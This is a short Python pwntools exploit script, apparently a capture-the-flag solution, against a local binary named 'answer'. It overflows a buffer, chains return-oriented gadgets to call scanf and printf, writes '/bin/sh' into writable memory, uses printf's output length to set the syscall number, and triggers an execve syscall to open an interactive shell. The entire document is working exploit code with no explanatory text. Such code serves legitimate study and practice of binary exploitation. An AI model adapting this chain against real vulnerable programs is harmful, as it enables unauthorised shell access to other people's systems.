#!/usr/bin/python -i

from pwn import *

r = process('./answer')

gdb.attach(r)

syscall_gadget = 0x400613

pop_rdi = 0x4006a3
pop_rsi_r15 = 0x4006a1

scanf_plt = 0x4004a0
printf_plt = 0x400480

fmtstr = 0x4006d3
writeable_pos = 0x601100

p = cyclic(24)


def rop_call(rip=0, rdi=0, rsi=0):
    p = ''
    p += p64(pop_rdi)
    p += p64(rdi)
    p += p64(pop_rsi_r15)
    p += p64(rsi)
    p += p64(0xdeadbeeffeedbeef)
    p += p64(rip)
    return p


def scanf_call(rdi=0, rsi=0):
    return rop_call(scanf_plt, rdi, rsi)


def printf_call(rdi=0, rsi=0):
    return rop_call(printf_plt, rdi, rsi)


p += scanf_call(fmtstr, writeable_pos)
p += scanf_call(fmtstr, writeable_pos + 0x30)
p += printf_call(writeable_pos + 0x30)
p += rop_call(syscall_gadget, writeable_pos, writeable_pos + 8)

raw_input('first payload    ->')

r.send(p + '\n')

raw_input('second payload   ->')

p = ''
p += '/bin/sh\0'
p += p64(writeable_pos)
p += p64(0)

r.send(p + '\n')

raw_input('third payload    ->')

r.send(cyclic(59) + '\n')

r.interactive()
